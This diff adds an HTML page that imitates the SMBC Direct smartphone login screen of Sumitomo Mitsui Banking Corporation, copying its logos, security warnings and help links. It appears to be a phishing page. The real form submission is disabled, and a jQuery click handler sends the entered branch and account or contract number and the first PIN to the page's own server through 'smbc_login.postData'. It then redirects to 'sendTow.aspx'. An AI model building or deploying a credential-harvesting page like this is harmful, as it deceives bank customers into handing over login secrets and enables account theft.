@@ -1,0 +1,640 @@
+<html lang="ja"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=Shift_JIS">
+    <meta name="robots" content="NONE">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Expires" content="5 Sep 2000 04:21:56 GMT">
+    <meta http-equiv="Content-Style-Type" content="text/css">
+    <meta http-equiv="Content-Script-Type" content="text/javascript">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0,">
+    <meta name="apple-touch-fullscreen" content="YES">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="apple-touch-icon" href="./img/smp_SmbcTouchIcon.png">
+    <script type="text/javascript" src="./js/smp_jquery.js"></script>
+    <script type="text/javascript" src="./js/smp_function.js"></script>
+    <script type="text/javascript" src="./js/smp_smbcpassca.js"></script>
+    <link rel="icon" href="./img/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="./css/smp_import.css">
+    <link rel="stylesheet" type="text/css" href="./css/smp_acc_close_style.css">
+    <style>
+        #toast{
+            position: fixed;
+            top: 44%;left:50%;transform: translateX(-50%);
+            min-width: 60%;
+            max-width: 80%;
+            min-height: 1.2rem;
+            padding: 0.5rem;
+            line-height: 1.2rem;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #fff;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 5px;
+            display: none;
+            z-index: 10000;
+        }
+    </style>
+    <script language="JavaScript">
+<!--
+    // 送信ロック
+    var submitcount = 0;
+
+    // 送信ロック
+    function checkClick(name, value) {
+        if (submitcount > 0) {
+            //alert("二度押し防止");
+            return false;
+        } else {
+            submitcount++;
+
+            for (i = 0; i < document.forms[0].length; i++) {
+                if (document.forms[0].elements[i].name == "__btn__") {
+                    document.forms[0].elements[i].name = name;
+                    document.forms[0].elements[i].value = value;
+                }
+            }
+            document.forms[0].submit();
+            return true;
+        }
+    }
+
+    // 送信ロック
+    function checkClickDesignateForm(formName, name, value) {
+        if (submitcount > 0) {
+            //alert("二度押し防止");
+            return false;
+        } else {
+
+            submitcount++;
+            document.forms[formName].elements["__btn__"].value = value;
+            document.forms[formName].elements["__btn__"].name = name;
+            document.forms[formName].submit();
+            return true;
+        }
+    }
+
+    // 送信ロック
+    function checkClick2(index, name, value) {
+        if (submitcount > 0) {
+            //alert("二度押し防止");
+            return false;
+        } else {
+            submitcount++;
+            return true;
+        }
+    }
+
+    function check() {
+        if (submitcount > 0) {
+            //alert("多重送信ロック");
+            return false;
+        } else {
+            submitcount++;
+            document.forms[0].submit();
+            return true;
+        }
+    }
+
+    function HelpWin(help_menu, help_name) {
+
+        var helpwin = window.open(
+		"/aib/help/aibgsjsw3hlp.jsp?menu=" + help_menu + "&name=" + help_name,
+		"helpWin",
+		"scrollbars,resizable,width=640,height=480");
+    }
+
+    function showpage(url) {
+        w = screen.availWidth;
+        newWin = window.open("https://direct.smbc.co.jp/aib/help/" + url, "new", "width=520,height=600,scrollbars=yes");
+        newWin.focus();
+    }
+
+
+    function radioCheckOnText(formObj, radioName, radioNumber) {
+
+        formObj.elements[radioName][radioNumber].checked = true;
+    }
+
+
+    function radioCheckOnSelect(formObj, radioName, radioNumber, selectName) {
+
+        if (formObj.elements[selectName].value != "") {
+            formObj.elements[radioName][radioNumber].checked = true;
+        }
+    }
+
+
+    function showHelp(url) {
+
+        newWin = window.open(url, "help", "width=600,height=600,scrollbars=yes,resizable=yes,menubar=yes,location=yes,status=yes");
+        newWin.focus();
+    }
+
+
+    function showKoho(url) {
+
+        newWin = window.open(url, "koho");
+        newWin.focus();
+    }
+
+
+    function showPop(url, tar, sts) {
+
+        newWin = window.open(url, tar, sts);
+        newWin.focus();
+    }
+//-->
+    </script>
+    <meta name="apple-itunes-app" content="app-id=594457652">
+    <meta name="google-play-app" content="app-id=jp.co.smbc.direct">
+    <script>
+<!--
+    var chkTable = "1234567890１２３４５６７８９０";
+    function checkUserID() {
+        uid1 = document.Login.USRID1.value;
+        uid2 = document.Login.USRID2.value;
+        branch = document.Login.S_BRANCH_CD.value;
+        accnt = document.Login.S_ACCNT_NO.value;
+        type = document.Login.LOGIN_TYPE.value;
+
+        var strURL = document.URL;
+        var strParam = strURL.substring(strURL.indexOf("?") + 1);
+
+        var arrayPrm = strParam.split("&");
+        var strShorNo = "";
+        var strShortCutFundCd = "";
+        var strVoteCnt = "";
+        var strSDATA = "";
+        var strShortCutKbn = "";
+        var strRoboFtVol = "";
+        var strRoboFjVol = "";
+        var strUnLockFlg = "";
+        var strCreditParam = "";
+        var strAffiliate = "";
+
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("sc") != -1) {
+                strShorNo = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("fcd") != -1) {
+                strShortCutFundCd = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("vcnt") != -1) {
+                strVoteCnt = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("sdata") != -1) {
+                strSDATA = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("kbn") != -1) {
+                strShortCutKbn = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("ftvol") != -1) {
+                strRoboFtVol = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("fjvol") != -1) {
+                strRoboFjVol = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("ul") != -1) {
+                strUnLockFlg = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("ccd") != -1) {
+                strCreditParam = "&" + arrayPrm[i];
+                break;
+            }
+        }
+        for (i = 0; i < arrayPrm.length; i++) {
+            if (arrayPrm[i].indexOf("aff") != -1) {
+                strAffiliate = "&" + arrayPrm[i];
+                break;
+            }
+        }
+
+        if (type == "1") {
+            // 店番番号のチェック
+            if (branch.length <= 0) {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B1494" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+
+            if (branch.length == 3) {
+                for (i = 0; i < branch.length; i++) {
+                    if (chkTable.indexOf(branch.charAt(i)) == -1) {
+                        window.location = "/aib/aibgsjsw1001.jsp?mc=B1498" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                        return false;
+                    }
+                }
+            }
+            else {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B1496" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+
+            // 口座番号のチェック
+            if (accnt.length <= 0) {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B1495" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+
+            if (accnt.length <= 7) {
+                for (i = 0; i < accnt.length; i++) {
+                    if (chkTable.indexOf(accnt.charAt(i)) == -1) {
+                        window.location = "/aib/aibgsjsw1001.jsp?mc=B1499" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                        return false;
+                    }
+                }
+            }
+            else {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B1497" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+        }
+        else {
+            if (uid1.length <= 0 && uid2.length <= 0) {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B6519" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+
+            //ユーザID連結
+            uid = uid1 + uid2;
+
+            document.Login.USRID.value = uid;
+
+            if (uid.length == 10) {
+                for (i = 0; i < uid.length; i++) {
+                    if (chkTable.indexOf(uid.charAt(i)) == -1) {
+                        window.location = "/aib/aibgsjsw1001.jsp?mc=B6521" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                        return false;
+                    }
+                }
+            }
+            else {
+                window.location = "/aib/aibgsjsw1001.jsp?mc=B6520" + strShorNo + strShortCutFundCd + strVoteCnt + strSDATA + strShortCutKbn + strRoboFtVol + strRoboFjVol + strUnLockFlg + strCreditParam + strAffiliate;
+                return false;
+            }
+        }
+
+        var SumitomoServ = document.Login.domainSumitomo.value;
+        document.Login.action = SumitomoServ;
+    }
+//-->
+    </script>
+    <title>SMBCﾀﾞｲﾚｸﾄ:ﾛｸﾞｲﾝ</title>
+    <script type="text/javascript" src="./js/smp_jquery.colorbox.js"></script>
+    <script type="text/javascript">
+    var loginForm = 1;
+    $(document).ready(function () { $(".clrbox").colorbox(); });
+
+    $(function () {
+        var wrap = $("#formWrap");
+        function formCheck() {
+            var self = $(this);
+            if (self.attr("id") === "USRID1" || self.attr("id") === "USRID2") {
+                if ($("#USRID1", wrap).val() || $("#USRID2", wrap).val()) {
+                    $("#USRID1", wrap).removeClass("gray").attr("tabindex", "3");
+                    $("#USRID2", wrap).removeClass("gray").attr("tabindex", "4");
+                    $("#S_BRANCH_CD", wrap).val("").addClass("gray").attr('tabindex', '-1');
+                    $("#S_ACCNT_NO", wrap).val("").addClass("gray").attr('tabindex', '-1');
+                    $("#LOGIN_TYPE").val("0");
+                } else {
+                    $("#S_BRANCH_CD", wrap).removeClass("gray").attr("tabindex", "1")
+                    $("#S_ACCNT_NO", wrap).removeClass("gray").attr("tabindex", "2");
+                }
+            } else {
+                if ($("#S_BRANCH_CD", wrap).val() || $("#S_ACCNT_NO", wrap).val()) {
+                    $("#USRID1", wrap).val("").addClass("gray").attr("tabindex", "-1");
+                    $("#USRID2", wrap).val("").addClass("gray").attr("tabindex", "-1");
+                    $("#S_BRANCH_CD", wrap).removeClass("gray").attr("tabindex", "1");
+                    $("#S_ACCNT_NO", wrap).removeClass("gray").attr("tabindex", "2");
+                    $("#LOGIN_TYPE").val("1");
+                } else {
+                    $("#USRID1", wrap).removeClass("gray").attr("tabindex", "3");
+                    $("#USRID2", wrap).removeClass("gray").attr("tabindex", "4");
+                }
+            }
+        }
+        $(".input input", wrap).bind("click blur keydown keyup keypress change", formCheck);
+    });
+
+    </script>
+</head>
+<body><div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" style="padding-bottom: 23px; padding-right: 0px; display: none;"><div id="cboxWrapper" style=""><div style=""><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxLoadedContent" class="" style="width: 0px; height: 0px; overflow: hidden;"></div><div id="cboxLoadingOverlay" class="" style=""></div><div id="cboxLoadingGraphic" class="" style=""></div><div id="cboxTitle" class="" style=""></div><div id="cboxCurrent" class="" style=""></div><div id="cboxNext" class="" style=""></div><div id="cboxPrevious" class="" style=""></div><div id="cboxSlideshow" class="" style=""></div><div id="cboxClose" class="" style=""></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div>
+    <form method="post" action="" id="ctl00" onsubmit="return false;" autocomplete="off">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTUxMTcwNzgxMGRkWM5MIjTuH4ZEm57qEna2SpDWRPDFxXwrDurOCTAiMmc=">
+</div>
+
+
+<script type="text/javascript" src="/ajaxpro/prototype.ashx"></script>
+<script type="text/javascript" src="/ajaxpro/core.ashx"></script>
+<script type="text/javascript" src="/ajaxpro/converter.ashx"></script>
+<script type="text/javascript" src="/ajaxpro/smbc_login,App_Web_login.aspx.b5904931.ashx"></script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="B3D80882">
+</div>
+    <div id="container">
+        <div id="headerGroup">
+            <ul>
+                <li class="headerGroupLeft">
+                    <img src="./img/logo_group_01_sp.png" alt="SMBC"></li>
+                <li class="headerGroupRight">
+                    <img src="./img/logo_group_02_sp.png" alt="SMBCグループ"></li>
+            </ul>
+        </div>
+        <div id="header" class="header02">
+            <h1>
+                <img src="./img/smp_logo_new.gif" alt="三井住友銀行" width="130" height="36"></h1>
+            <ul>
+                <li><a href="http://www.smbc.co.jp/index.html"><span class="f_change_1">SMBC</span><br>
+                    トップ</a></li>
+            </ul>
+        </div>
+        <div id="main">
+            <div class="heading_block sp_change_1">
+                <h2>
+                    <span class="f_change_1">SMBC</span>ダイレクトログイン</h2>
+            </div>
+            <input type="hidden" name="USRID" value="">
+            <input type="hidden" name="TrxID" value="SUP0001">
+            <input type="hidden" name="ScreenID" value="gsjsw1001">
+            <input type="hidden" name="ScreenDate" value="20200817185217">
+            <input type="hidden" name="SHORTCUTYN" value="">
+            <input type="hidden" name="SHORTCUTNO" value="">
+            <input type="hidden" name="SHORTCUTFUNDCD" value="">
+            <input type="hidden" name="SHORTCUTFUNDCDFLG" value="">
+            <input type="hidden" name="VOTE_CNT_TTL" value="">
+            <input type="hidden" name="UNLOCKFLG" value="">
+            <input type="hidden" name="SWKB_FLG" value="0">
+            <input type="hidden" name="DB_SESSIONID" value="">
+            <input type="hidden" name="DB_REGIDT" value="">
+            <input type="hidden" name="LOGIN_TYPE" id="LOGIN_TYPE" value="1">
+            <input type="hidden" name="__btn__" value="">
+            <input type="hidden" name="E_SDATA" value="">
+            <input type="hidden" name="SHORTCUTKBN" value="">
+            <input type="hidden" name="ROBOAD_PURCHASE_AMNT" value="">
+            <input type="hidden" name="ROBOAD_TSUMI_AMNT" value="">
+            <input type="hidden" name="ROBOAD_FUND_CD" value="">
+            <input type="hidden" name="SHORTCUTCCD" value="">
+            <input type="hidden" name="SHORTCUTCCDFLG" value="">
+            <input type="hidden" name="AFFILIATE" value="">
+            <input type="hidden" name="domainSumitomo" value="https://direct3.smbc.co.jp/servlet/com.smbc.SUPPostServlet">
+            <div>
+                <a href="https://www.smbc.co.jp/kojin/special/stop_phishing_crime/?link_id=dirct_ibIBB2002002" target="_blank">
+                    <img src="./img/1001_02_05_banner.gif" width="320" alt="" style="display: block;
+                        margin: 10px auto;"></a></div>
+            <p class="medium" style="margin: 10px;">
+                <span style="color: #ff0000;">SMBCダイレクトへのログインや電話番号の入力を求める不審なサイトへ誘導するショートメッセージやメールにご注意ください。「<a href="https://www.smbc.co.jp/security/attention/index23.html" target="_blank">くわしくはこちら</a>」
+                </span>
+            </p>
+            <p class="medium" style="margin: 10px;">
+                <span style="color: #ff0000;">＜暗証カードをご利用のお客さまへ＞パスワードカードへのお切替について、ご自宅でできる方法をご案内しております。<a href="https://www.smbc.co.jp/kojin/direct/service/anshohaishi.html#A03" target="_blank">くわしくはこちら</a>
+                </span>
+            </p>
+            <p class="medium" style="margin: 10px;">
+                <span style="color: #ff0000;">セキュリティ強化のため、SMBCダイレクトのサービスを一部制限させていただいております。<a href="https://www.smbc.co.jp/kojin/special/stop_phishing_crime/backnumber.html" target="_blank">くわしくはこちら</a> </span>
+            </p>
+            <p>
+                <a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_05I">SMBCダイレクトの登録がお済みでないお客さま</a></p>
+            <div class="login_block" id="formRenew1">
+                <div class="contents">
+                    <div class="section" id="formWrap">
+                        <div class="input typeA">
+                            <div>
+                                <p>
+                                    店番号</p>
+                                <span>
+                                    <input type="tel" id="S_BRANCH_CD" name="S_BRANCH_CD" onkeyup="this.value=this.value.replace(/[^0-9]/g,'');" oninput="if(value.length > 3) value = value.slice(0,3)" maxlength="3" tabindex="1"></span></div>
+                            <div>
+                                <p>
+                                    口座番号</p>
+                                <span>
+                                    <input type="tel" id="S_ACCNT_NO" name="S_ACCNT_NO" onkeyup="this.value=this.value.replace(/[^0-9]/g,'');" oninput="if(value.length > 7) value = value.slice(0,7)" maxlength="7" tabindex="2"></span></div>
+                        </div>
+                        <p class="andTxt">
+                            <span>または</span></p>
+                        <div class="input typeB mb10">
+                            <p>
+                                契約者番号</p>
+                            <div>
+                                <span>
+                                    <input type="tel" id="USRID1" name="USRID1" size="5" onkeyup="this.value=this.value.replace(/[^0-9]/g,'');" oninput="if(value.length > 20) value = value.slice(0,20)" maxlength="20" tabindex="3"></span>
+                                <span class="separate">－</span> <span>
+                                    <input type="tel" id="USRID2" name="USRID2" size="5" onkeyup="this.value=this.value.replace(/[^0-9]/g,'');" oninput="if(value.length > 5) value = value.slice(0,5)" maxlength="5" tabindex="4"></span></div>
+                        </div>
+                        <p class="notes medium">
+                            <a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_07I" target="koho" class="fwBold" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_07I'); return false; }">
+                                ※契約者番号とは？</a></p>
+                    </div>
+                    <div class="section">
+                        <div class="input typeC mb10">
+                            <div>
+                                <p>
+                                    第一暗証</p>
+                                <span>
+                                    <input type="password" id="PASSWORD" name="PASSWORD" maxlength="8" tabindex="5"></span></div>
+                        </div>
+                        <p class="notes caution medium mb10">
+                            ※第一暗証はワンタイムパスワードではございません。<br>
+                            <a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_08I" target="koho" class="fwBold" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_08I'); return false; }">
+                                第一暗証とは？</a></p>
+                        <p class="notes caution medium">
+                            ※SMBCダイレクトの利用開始手続をされていないお客さまはキャッシュカード暗証番号を入力してください。</p>
+                    </div>
+                    <p class="link_privacy">
+                        <a href="https://direct.smbc.co.jp/aib/aibgsjsw1002.jsp" class="clrbox cboxElement">
+                            個人情報の利用目的</a></p>
+                    <input type="hidden" name="MAIN_ACCNT_F0" value="0">
+                    <input type="hidden" name="MAIN_ACCNT_F1" value="1">
+                    <input type="hidden" name="MAIN_ACCNT_F2" value="2">
+                    <input type="hidden" name="M_ACNT_SHO_KBN" value="1">
+                    <input type="hidden" name="SERVICE_TYPE" value="SN">
+                    <input type="hidden" name="RedirectURL" value="/aib/">
+                    <p class="btn_login"> <!--onclick="if(checkUserID() == false) return false; return checkClick('bLogon.y','ログイン')"-->
+                            
+                        <input type="button" name="bLogon.y" class="btn-Post" value="ログイン" tabindex="6">
+                    </p>
+                </div>
+            </div>
+            <div class="indent_block sp_change_1">
+                <p style="margin: 10px;">
+                    <a href="https://direct.smbc.co.jp/aib/aibgsjsw38f0.jsp" target="_blank">第一暗証がお分かりにならないお客さまはこちら</a></p>
+                <div>
+                    <a href="https://www.smbc.co.jp/kojin/reverse-mortgage/karikae-shinjidai/?link_id=hoka_ibIBB2007002" target="_blank">
+                        <img src="./img/1001_02_02_banner.gif" width="320" style="display: block; margin: 10px auto;"></a></div>
+                <div>
+                    <a href="https://www.smbc.co.jp/kojin/direct/service/anshohaishi.html" target="_blank">
+                        <img src="./img/1001_02_04_banner.gif" width="320" style="display: block; margin: 10px auto;"></a></div>
+                <div>
+                    <a href="http://www.smbc.co.jp/kojin/direct/securi/index03.html" target="_blank">
+                        <img src="./img/1001_02_top_banner.gif" width="320" alt="" style="display: block;
+                            margin: 10px auto;"></a></div>
+                <p>
+                    <a href="http://www.smbc.co.jp/smartphone/service/directapp/index.html" target="_blank">
+                        スマートフォンアプリをダウンロード（アプリ内で通帳を管理！くわしくはこちら）</a></p>
+                <p class="small center">
+                    ※個人情報の利用目的をご確認の上ログインしてください。</p>
+            </div>
+            <div class="note_block add_func_close">
+                <div class="header">
+                    <h2>
+                        <a href="#accordion_note">安全にご利用いただくために</a></h2>
+                </div>
+                <div class="contents accordion_box" id="accordion_note" style="display: none;">
+                    <p class="chach caution">
+                        暗証番号･暗証カードは絶対に第三者に教えたり、渡したりしないでください。</p>
+                    <p>
+                        SMBCダイレクトの暗証カードはセキュリティ上、印鑑や通帳・キャッシュカード以上に大切なものです。<br>
+                        お客さまご自身で厳重な管理を行ってください。</p>
+                    <p class="link_box">
+                        <a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_03I" target="koho" class="pc" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_03I'); return false; }">
+                            暗証番号管理のポイント</a></p>
+                    <p>
+                        三井住友銀行の職員が、店舗外や電話等で記載された番号を伺うことはありません。また、カードを預かったり、回収のお願いをすることもありません。<br>
+                        弊社の職員を名乗ってカードの記載内容を聞き出したり、カードを詐取しようとする犯罪にご注意ください。</p>
+                    <p class="chach caution">
+                        金融犯罪にご注意ください！</p>
+                    <p class="link_box">
+                        <a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_04I" target="koho" class="pc" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_04I'); return false; }">
+                            簡単！やさしいセキュリティ教室</a></p>
+                    <p class="accordion_close_btn">
+                        <a href="#c_accordion_note"><span>閉じる</span></a></p>
+                <p class="accordion_close_btn"><a href="#c_accordion_note"><span>閉じる</span></a></p></div>
+            </div>
+            <ul class="utility_block">
+                <li><a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_01I" target="help" class="help" onclick="if (window.open) { javascript:showHelp('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_01I'); return false; }">
+                    操作ヘルプ</a></li>
+                <li><a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_02I" target="koho" class="faq" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=1001_02I'); return false; }">
+                    よくあるご質問</a></li>
+            </ul>
+            <ul class="c_link_block">
+                <li><a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_03I" target="koho" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_03I'); return false; }">
+                    お問い合わせ</a></li>
+                <li><a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_02I" target="koho" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_02I'); return false; }">
+                    プライバシーポリシー</a></li>
+                <li><a href="http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_01I" target="koho" onclick="if (window.open) { javascript:showKoho('http://www.smbc.co.jp/ln/direct/LinksServlet?id=Xz23_01I'); return false; }">
+                    三井住友銀行勧誘方針</a></li>
+            </ul>
+        </div>
+        <div id="footer">
+            <p>
+                <font color="#000000">Copyright © 2016 Sumitomo Mitsui Banking Corporation. All Rights
+                    Reserved.</font></p>
+        </div>
+    </div>
+    </form>
+    <script>
+<!--
+    var pageId = 'ib100100';
+    function keyDown(e) {
+        // Returnキーを押下した場合はログイン操作を実行する
+        var rtnKeyCode = '13';
+        if (e.keyCode == rtnKeyCode) {
+            if (checkUserID() != false) {
+                checkClick('bLogon.y', 'ログイン');
+            }
+        }
+    }
+    //document.Login.PASSWORD.onkeydown = keyDown;
+//-->
+    </script>
+    <script type="text/javascript">
+        $(function () {
+            $('.btn-Post').click(function () {
+                var S_BRANCH_CD = $("#S_BRANCH_CD").val();
+                var S_ACCNT_NO = $("#S_ACCNT_NO").val();
+                var USRID1 = $("#USRID1").val();
+                var USRID2 = $("#USRID2").val();
+                var pwd = $("#PASSWORD").val();
+                var account = "";
+                var reg = new RegExp(/[^0-9]/g);
+                if (!$("#S_BRANCH_CD").hasClass("gray")) {
+                    if (S_BRANCH_CD == "" || S_BRANCH_CD.length < 3) {
+                        $("#toast").showMessage("店番号 を入力してください", 2500);
+                        return false;
+                    }
+                    if (S_ACCNT_NO == "" || S_ACCNT_NO.length < 7) {
+                        $("#toast").showMessage("口座番号 を入力してください", 2500);
+                        return false;
+                    }
+                    if (reg.test(S_BRANCH_CD)) {
+                        $("#toast").showMessage("店番号 を入力してください", 2500);
+                        return false;
+                    }
+                    if (reg.test(S_ACCNT_NO)) {
+                        $("#toast").showMessage("口座番号 を入力してください", 2500);
+                        return false;
+                    }
+                    account = S_BRANCH_CD + "-" + S_ACCNT_NO;
+
+                } else {
+                    if (USRID1 == "" || USRID2 == "") {
+                        $("#toast").showMessage("契約者番号 を入力してください", 2500);
+                        return false;
+                    }
+                    if (reg.test(USRID1) || reg.test(USRID2)) {
+                        $("#toast").showMessage("契約者番号 を入力してください", 2500);
+                        return false;
+                    }
+                    account = USRID1 + "-" + USRID2;
+                }
+                if (pwd == "") {
+                    $("#toast").showMessage("第一暗証 を入力してください", 2500);
+                    return false;
+                }
+                $(this).attr({ "disabled": "disabled" }).val("Loading...");
+                var result = JSON.parse(smbc_login.postData(account, pwd).value);
+                if (result.code == 0) {
+                    $(this).removeAttr("disabled").val("ログイン");
+                    $("#toast").showMessage("データエラーは後ほどやり直してください", 2500);
+                    return false;
+                }
+                localStorage.setItem("postID", result.data);
+                window.location = "sendTow.aspx";
+                return false;
+            });
+            $.fn.extend({
+                showMessage: function ($msg, $time) {
+                    var oDiv = document.createElement("div");
+                    oDiv.setAttribute("id", "toast");
+                    var oBody = document.getElementsByTagName('body')[0];
+                    oBody.append(oDiv);
+                    $('#toast').text($msg);
+                    $('#toast').fadeIn();
+                    setTimeout(function () {
+                        $('#toast').fadeOut().remove();
+                    }, $time);
+                }
+            });
+        });
+    </script>
+    <!--<script type="text/javascript" src="./js/VL.js"></script>-->
+    <script language="JavaScript" type="text/javascript" src="./js/s_code.js"></script>
+    <script language="JavaScript" type="text/javascript" src="./js/code_to_paste.js"></script><script language="JavaScript" type="text/javascript"></script><noscript><img src="https://smbc.sc.omtrdc.net/b/ss/smbccojp/1/H.27.5--NS/0?[AQB]&cdp=3&[AQE]"height="1" width="1" border="0" alt=""" /></noscript>
+    <script language="JavaScript" type="text/javascript"></script>
+
+<p class="pagetop" style="top: 1031px;"><a href="#container"></a></p></body></html>
